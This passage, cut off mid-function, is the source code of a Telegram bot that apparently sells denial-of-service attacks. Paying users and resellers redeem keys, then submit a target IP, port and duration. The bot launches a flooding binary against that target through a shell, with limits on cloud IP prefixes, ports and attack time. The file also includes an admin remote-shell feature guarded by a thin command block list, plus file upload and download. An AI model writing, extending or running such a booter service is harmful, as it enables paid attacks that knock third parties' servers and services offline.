
# ===========================================================
#                  MEGOXER BOT SCRIPT
# ===========================================================

# --------------------[ IMPORTS ]----------------------------

import os
import time
import json
import pytz
import json
import random
import string
import telebot
import datetime
import subprocess
import threading
from telebot import types
from typing import Optional

# --------------------[ CONFIGURATION ]----------------------

# Load configuration from info.json
with open("info.json", "r") as info_file:
    info = json.load(info_file)

# Get bot token and admin IDs from info.json
BOT_TOKEN = info["bot_token"]
admin_id = set(info["admin_ids"])

bot = telebot.TeleBot(BOT_TOKEN)

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# Attack setting for users
ALLOWED_PORT_RANGE = range(10003, 30000)
ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}
KEY_COSTS = {1: 80, 7: 400, 30: 900}
UPDATE_INTERVAL = 1

# --------------------[ IN-MEMORY STORAGE ]----------------------

keys = {}
users = {}
bot_data = {}
upload_events = {}
admin_sessions = {}
attack_status = {}
message_store = {}
user_cooldowns = {}
user_last_attack = {}
attack_in_process = False
attack_start_time: Optional[datetime.datetime] = None
attack_duration = 0
pending_broadcasts = {} 
active_timers = {} 

# --------------------[ STORAGE ]----------------------



# --- Data Loading and Saving Functions ---

def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file, indent=4)
        
def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file, indent=4)
     
try:
    with open("reseller.json", "r") as f:
        resellers = json.load(f)
except FileNotFoundError:
    resellers = {}
    
def save_resellers():
    with open("reseller.json", "w") as f:
        json.dump(resellers, f, indent=4)
    
def generate_key(duration):
    characters = string.ascii_letters + string.digits
    random_part = ''.join(random.choice(characters) for _ in range(10)).upper()
    return f"{key_prefix}-{duration.upper()}-{random_part}"

def add_time_to_current_date(hours=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M:%S')

def convert_utc_to_ist(utc_time_str):
    utc_time = datetime.datetime.strptime(utc_time_str, '%Y-%m-%d %H:%M:%S')
    utc_time = utc_time.replace(tzinfo=pytz.utc)
    ist_time = utc_time.astimezone(pytz.timezone('Asia/Kolkata'))
    return ist_time.strftime('%Y-%m-%d %H:%M:%S')
    
# Load configuration
def load_config():
    config_file = "config.json"

    if not os.path.exists(config_file):
        print(f"Config file {config_file} does not exist. Please create it.")
        exit(1)

    try:
        with open(config_file, 'r') as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON in {config_file}: {str(e)}")
        exit(1)

config = load_config()

full_command_type = config["initial_parameters"]
threads = config.get("initial_threads")
packets = config.get("initial_packets")
BINARY = config.get("initial_binary")
MAX_ATTACK_TIME = config.get("max_attack_time")
ATTACK_COOLDOWN = config.get("attack_cooldown")
ATTACK_PROCESS = "attack_in_process" 
credit = config.get("credit_name")
key_prefix = config.get("key_prefix_name")

def save_config():
    config = {
        "initial_parameters": full_command_type,
        "initial_threads": threads,
        "initial_packets": packets,
        "initial_binary": BINARY,
        "max_attack_time": MAX_ATTACK_TIME,
        "attack_cooldown": ATTACK_COOLDOWN,
        "credit_name": credit,
        "key_prefix_name": key_prefix,
        "attack_in_process": ATTACK_PROCESS
    }

    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

# --- Log command function ---
def log_command(user_id, target, port, time_duration):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"{user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Time: {datetime.datetime.now()}\nUsername: {username}\nTarget: {target}\nPort: {port}\nTime: {time_duration}\n\n")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ KEYBOARD BUTTONS ]----------------------
    
@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)

    # Define buttons
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    settings_button = types.KeyboardButton("⚙️ Settings")
    terminal_button = types.KeyboardButton("⏺️ Terminal")
    panel_button = types.KeyboardButton("🔰 Panel")  # Adjusted label for clarity
        
    if str(message.chat.id) in resellers:
        markup.add(attack_button, myinfo_button, redeem_button, panel_button)
        
    elif str(message.chat.id) in admin_id:
        markup.add(attack_button, myinfo_button, redeem_button, settings_button, terminal_button, panel_button)
        
    else:
        markup.add(attack_button, myinfo_button, redeem_button)
        
    bot.reply_to(message, f"*Welcome to {credit} bot!*", reply_markup=markup, parse_mode='Markdown')
    
@bot.message_handler(func=lambda message: message.text == "⚙️ Settings")
def settings_command(message):
    """Admin-only settings menu."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        attack_status_button = types.KeyboardButton("Attack Status")
        attack_setting_button = types.KeyboardButton("Attack Setting")
        back_button = types.KeyboardButton("<< Back to Menu")

        markup.add(attack_status_button, attack_setting_button, back_button)
        bot.reply_to(message, "⚙️ 𝗦𝗘𝗧𝗧𝗜𝗡𝗚 𝗠𝗘𝗡𝗨", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "Attack Status")
def settings_command(message):
    """Admin-only settings menu."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        attack_cooldown_button = types.KeyboardButton("Attack Cooldown")
        attack_process_button = types.KeyboardButton("Attack Process")
        attack_time_button = types.KeyboardButton("Attack Time")
        back_button = types.KeyboardButton("<< Back to Menu")

        markup.add(attack_process_button, attack_cooldown_button, attack_time_button, back_button)
        bot.reply_to(message, "☣️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "Attack Setting")
def settings_command(message):
    """Admin-only settings menu."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        threads_button = types.KeyboardButton("Threads")
        packets_button = types.KeyboardButton("Packets")
        binary_button = types.KeyboardButton("Binary")
        command_button = types.KeyboardButton("Parameters")
        back_button = types.KeyboardButton("<< Back to Menu")

        markup.add(threads_button, binary_button, packets_button, command_button, back_button)
        bot.reply_to(message, "✴️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "⏺️ Terminal")
def terminal_menu(message):
    """Show the terminal menu for admins."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        command_button = types.KeyboardButton("Command")
        upload_button = types.KeyboardButton("Upload")
        download_button = types.KeyboardButton("Download")
        back_button = types.KeyboardButton("<< Back to Menu")
        markup.add(command_button, upload_button, download_button, back_button)
        bot.reply_to(message, "⚙️ 𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗟 𝗠𝗘𝗡𝗨", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "🔰 Panel")
def show_admin_panel(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or resellers:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        admin_button = types.KeyboardButton("Admin Panel")
        reseller_manager_button = types.KeyboardButton("Reseller Panel")
        back_button = types.KeyboardButton("<< Back to Menu")
        markup.add(admin_button, reseller_manager_button, back_button)

        bot.reply_to(message, "🔰 𝗣𝗔𝗡𝗘𝗟", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "Admin Panel")
def show_key_manager(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        genkey_button = types.KeyboardButton("Generate Key")
        controll_button = types.KeyboardButton("Controll Access")
        add_user_button = types.KeyboardButton("Add User")
        view_keys_button = types.KeyboardButton("View Keys")
        back_button = types.KeyboardButton("<< Back to Menu")
        markup.add(genkey_button, add_user_button, view_keys_button, controll_button, back_button)

        bot.reply_to(message, "☣️ 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "Reseller Panel")
def show_access_manager(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or resellers:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)

        genkey_button = types.KeyboardButton("Generate Key")
        balance_button = types.KeyboardButton("Balance")
        mykey_button = types.KeyboardButton("My Keys")
        reset_button = types.KeyboardButton("Reset Key")
        back_button = types.KeyboardButton("<< Back to Menu")
                
        markup.add(genkey_button, mykey_button, balance_button, reset_button, back_button)
        bot.reply_to(message, "🛠️ 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗣𝗔𝗡𝗘𝗟", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

@bot.message_handler(func=lambda message: message.text == "<< Back to Menu")
def back_to_main_menu(message):
    """Go back to the main menu."""
    start_command(message)

# ------------------------------------------------------------
    
    
    
    
# --------------------[ ATTACK SECTION ]----------------------


@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    global attack_in_process
    user_id = str(message.chat.id)
    
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱❗️"
            bot.reply_to(message, response)
            return       
    else:
        bot.reply_to(message, "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")
        return
    
    if attack_in_process:
        bot.reply_to(message, "⛔️ 𝗔𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.\n𝗨𝘀𝗲 /check 𝘁𝗼 𝘀𝗲𝗲 𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲!")
        return

    response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
    bot.reply_to(message, response)
    bot.register_next_step_handler(message, process_attack_details)
     
def format_countdown_message(target: str, port: int, time_remaining: int, username: str) -> str:
    """Format the countdown message with attack details"""
    return (f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n"
            f"𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n"
            f"𝗧𝗶𝗺𝗲: {time_remaining} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
            f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}")

def update_countdown_timer(message_id: int, chat_id: int, target: str, port: int, duration: int, username: str) -> None:
    """Update the countdown timer in real-time"""
    timer_key = f"{chat_id}:{message_id}"
    active_timers[timer_key] = True
    end_time = time.time() + duration

    while time.time() < end_time and active_timers.get(timer_key, False):
        remaining_time = int(end_time - time.time())

        # Ensure we don't skip any seconds
        if remaining_time <= 0:
            remaining_time = 0

        try:
            updated_text = format_countdown_message(target, port, remaining_time, username)
            bot.edit_message_text(
                text=updated_text,
                chat_id=chat_id,
                message_id=message_id
            )

            # Sleep until the start of the next second
            next_second = end_time - remaining_time
            time_to_sleep = next_second - time.time()
            
            # If time_to_sleep is negative (if we are already past the next second), just move on to the next iteration
            if time_to_sleep > 0:
                time.sleep(time_to_sleep)

        except Exception as e:
            print(f"Error updating countdown: {e}")
            break

    active_timers.pop(timer_key, None)

def stop_timer(chat_id: int, message_id: int) -> None:
    """Stop a specific countdown timer"""
    timer_key = f"{chat_id}:{message_id}"
    active_timers.pop(timer_key, None)

def run_attack(command: str) -> None:
    """Execute the attack command"""
    subprocess.Popen(command, shell=True)

def process_attack_details(message):
    global attack_in_process, attack_start_time, attack_duration
    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) != 3:
        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁❗️\n")
        return

    if user_id in user_last_attack:
        time_since_last_attack = (datetime.datetime.now() - user_last_attack[user_id]).total_seconds()
        if time_since_last_attack < ATTACK_COOLDOWN:
            remaining_cooldown = int(ATTACK_COOLDOWN - time_since_last_attack)
            bot.reply_to(message, f"⛔ 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝘄𝗮𝗶𝘁 {remaining_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸𝗶𝗻𝗴 𝗮𝗴𝗮𝗶𝗻.")
            return

    try:
        target = details[0]
        port = int(details[1])
        time_duration = int(details[2])

        # Security checks
        if not target.startswith(ALLOWED_IP_PREFIXES):
            bot.reply_to(message, "⛔️ 𝗘𝗿𝗿𝗼𝗿: 𝗨𝘀𝗲 𝘃𝗮𝗹𝗶𝗱 𝗜𝗣 𝘁𝗼 𝗮𝘁𝘁𝗮𝗰𝗸")
            return

        if port not in ALLOWED_PORT_RANGE:
            bot.reply_to(message, f"⛔️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗮𝗿𝗲 𝗼𝗻𝗹𝘆 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗼𝗻 𝗽𝗼𝗿𝘁𝘀 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 [10003 - 29999]")
            return

        if port in BLOCKED_PORTS:
            bot.reply_to(message, f"⛔️ 𝗣𝗼𝗿𝘁 {port} 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝗮𝗻𝗱 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗲 𝘂𝘀𝗲𝗱!")
            return

        if time_duration > MAX_ATTACK_TIME:
            bot.reply_to(message, f"⛔️ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗶𝘀 {MAX_ATTACK_TIME} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀!")
            return

        # Set up attack command
        log_command(user_id, target, port, time_duration)
        if full_command_type == 1:
            full_command = f"./{BINARY} {target} {port} {time_duration}"
        elif full_command_type == 2:
            full_command = f"./{BINARY} {target} {port} {time_duration} {threads}"
        elif full_command_type == 3:
            full_command = f"./{BINARY} {target} {port} {time_duration} {packets} {threads}"
        else:
            bot.reply_to(message, "⛔️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝘁𝘆𝗽𝗲!")
            return

        username = message.chat.username or "No username"
        # Set attack status

        attack_in_process = True if ATTACK_PROCESS == "Active" else False
        attack_start_time = datetime.datetime.now()
        attack_duration = time_duration
        user_last_attack[user_id] = datetime.datetime.now()

        # Send initial attack message with countdown
        initial_message = format_countdown_message(target, port, time_duration, username)
        sent_message = bot.reply_to(message, initial_message)

        # Start countdown timer in separate thread
        timer_thread = threading.Thread(
            target=update_countdown_timer,
            args=(sent_message.message_id, message.chat.id, target, port, time_duration, username))
            
        timer_thread.daemon = True
        timer_thread.start()

        # Run attack in separate thread
        attack_thread = threading.Thread(target=run_attack, args=(full_command,))
        attack_thread.daemon = True
        attack_thread.start()

        # Schedule attack status reset
        threading.Timer(time_duration, reset_attack_status, args=[user_id]).start()

    except ValueError:
        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁❗️")

@bot.message_handler(commands=['check'])
def show_remaining_attack_time(message):
    if attack_in_process and attack_start_time is not None:
        elapsed_time = (datetime.datetime.now() - attack_start_time).total_seconds()
        remaining_time = max(0, attack_duration - elapsed_time)

        if remaining_time > 0:
            response = f"🚨 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀! 🚨\n\n𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲: {int(remaining_time)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀."
        else:
            response = "✅ 𝗧𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗵𝗮𝘀 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!"
    else:
        response = "✅ 𝗡𝗼 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀"

    bot.reply_to(message, response)

def reset_attack_status(user_id):
    global attack_in_process
    attack_in_process = False
    bot.send_message(user_id, "✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!")
    
# ---------------------------------------------------------------------
#   
#
#
#
# --------------------[ USERS AND SYSTEM INFO ]----------------------

@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    current_time = datetime.datetime.now()
    if user_id in admin_id:
        role = "Admin"
    elif user_id in resellers:
        role = "Reseller"
    else:
        role = "User"

    # Get expiration date safely
    expiration_date = users.get(user_id)

    if expiration_date:
        try:
            exp_datetime = datetime.datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S')
            if current_time < exp_datetime:
                expiry_text = f"🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {convert_utc_to_ist(expiration_date)}\n"
            else:
                expiry_text = "🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: Expired 🚫\n"  
        except ValueError:
            expiry_text = "🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: Expired 🚫\n"
    else:
        expiry_text = "🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: Not approved\n"

    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"🛂 𝗦𝘁𝗮𝘁𝘂𝘀: {role}\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"{expiry_text}"
    )

    bot.reply_to(message, response)
	
    
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found"
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)
        
@bot.message_handler(commands=['status'])
def status_command(message):
    """Show current status for threads, packets, and command type."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        ATTACK_PROCESS_STATUS = "𝗔𝗰𝘁𝗶𝘃𝗲 ✅" if ATTACK_PROCESS == "Active" else "𝗜𝗻𝗮𝗰𝘁𝗶𝘃𝗲 🅾️"
        # Prepare the status message
        status_message = (
            f"☣️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦 ☣️\n\n"
            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {ATTACK_COOLDOWN} \n"
            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗽𝗿𝗼𝗰𝗲𝘀𝘀: {ATTACK_PROCESS_STATUS}\n"
            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲: {MAX_ATTACK_TIME}\n\n"
            
            f"-----------------------------------\n"
            f"✴️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦 ✴️\n\n"
            f"▶️ 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀: {full_command_type}\n" 
            f"▶️ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲: {BINARY}\n"
            f"▶️ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {threads}\n"
            f"▶️ 𝗣𝗮𝗰𝗸𝗲𝘁𝘀: {packets}\n"
        )
        bot.reply_to(message, status_message)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ TERMINAL SECTION ]----------------------

# List of blocked command prefixes
blocked_prefixes = ["nano", "sudo", "rm *", "rm -rf *", "screen", "pip"]

@bot.message_handler(func=lambda message: message.text == "Command")
def command_to_terminal(message):
    """Handle sending commands to terminal for admins."""
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱:")
        bot.register_next_step_handler(message, execute_terminal_command)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def execute_terminal_command(message):
    """Execute the terminal command entered by the admin."""
    try:
        command = message.text.strip()
        
        # Check if the command starts with any of the blocked prefixes
        if any(command.startswith(blocked_prefix) for blocked_prefix in blocked_prefixes):
            bot.reply_to(message, "❗️𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱.")
            return
        
        # Execute the command if it's not blocked
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if output:
            bot.reply_to(message, f"⏺️ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗢𝘂𝘁𝗽𝘂𝘁:\n`{output}`", parse_mode='Markdown')
        else:
            bot.reply_to(message, "✅ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗲𝘅𝗲𝗰𝘂𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘂𝗹𝗹𝘆")
    except Exception as e:
        bot.reply_to(message, f"❗️ 𝗘𝗿𝗿𝗼𝗿 𝗘𝘅𝗲𝗰𝘂𝘁𝗶𝗻𝗴 𝗰𝗼𝗺𝗺𝗮𝗻𝗱: {str(e)}")


@bot.message_handler(func=lambda message: message.text == "Upload")
def upload_to_terminal(message):
    """Handle file upload to terminal for admins."""
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        sent_msg = bot.reply_to(message, "📤 𝗦𝗲𝗻𝗱 𝗮 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘂𝗽𝗹𝗼𝗮𝗱.")
        bot.register_next_step_handler(message, process_file_upload)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def upload_animation(chat_id, message_id, stop_event):
    """Looping animation for uploading progress."""
    dots = [".", "..", "..."]
    i = 0
    while not stop_event.is_set():  
        try:
            bot.edit_message_text(f"📤 𝗨𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴{dots[i]}", chat_id=chat_id, message_id=message_id)
            i = (i + 1) % len(dots)  # Cycle through [.", "..", "..."]
            time.sleep(0.3)  # Small delay to simulate progress
        except Exception as e:
            print(f"Error updating animation: {e}")  # Log any errors

def process_file_upload(message):
    """Process the uploaded file while showing a looping animation."""
    # Your logic here, replacing `upload_msg.message_id` with `sent_msg_id` wherever necessary
    if message.document:
        try:
            # Start uploading message
            upload_msg = bot.reply_to(message, "📤 𝗨𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴")

            # Start animation in a separate thread
            stop_event = threading.Event()
            animation_thread = threading.Thread(target=upload_animation, args=(message.chat.id, upload_msg.message_id, stop_event))
            animation_thread.start()

            # Get file info and download it
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            # Get the current script directory
            current_dir = os.path.dirname(os.path.abspath(__file__))

            # Save the file in the same directory
            file_path = os.path.join(current_dir, message.document.file_name)
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            # Stop animation
            stop_event.set()
            animation_thread.join()

            # Convert animation message to success message
            bot.edit_message_text(f"✅ 𝗙𝗶𝗹𝗲 𝘂𝗽𝗹𝗼𝗮𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆:\n`{file_path}`",  
                                  chat_id=message.chat.id,  
                                  message_id=upload_msg.message_id,  
                                  parse_mode="Markdown")

        except Exception as e:
            stop_event.set()  # Ensure animation stops if there's an error
            bot.reply_to(message, f"❗️ 𝗘𝗿𝗿𝗼𝗿 𝘂𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲: {str(e)}")
    else:
        bot.reply_to(message, "❗️ 𝗦𝗲𝗻𝗱 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘂𝗽𝗹𝗼𝗮𝗱.")


@bot.message_handler(func=lambda message: message.text == "Download")
def list_files(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.send_message(message.chat.id, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗢𝗻𝗹𝘆 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗶𝗹𝗲𝘀.")
        return

    # Restricted files
    restricted_extensions = {".py", ".enc"}
    restricted_files = {"megoxer.py", "megoxer.enc"}

    files = [
        f for f in os.listdir()
        if os.path.isfile(f)
        and not f.startswith(".")  # Hide hidden files
        and "." in f  # Show only files that have an extension
        and not any(f.endswith(ext) for ext in restricted_extensions)  # Hide specific extensions
        and f not in restricted_files  # Hide specific files
    ]

    if not files:
        bot.send_message(message.chat.id, "📁 𝗡𝗼 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗶𝗹𝗲𝘀 𝘁𝗼 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱.")
        return

    markup = types.InlineKeyboardMarkup()
    
    for file in sorted(files):  # Sorting files alphabetically
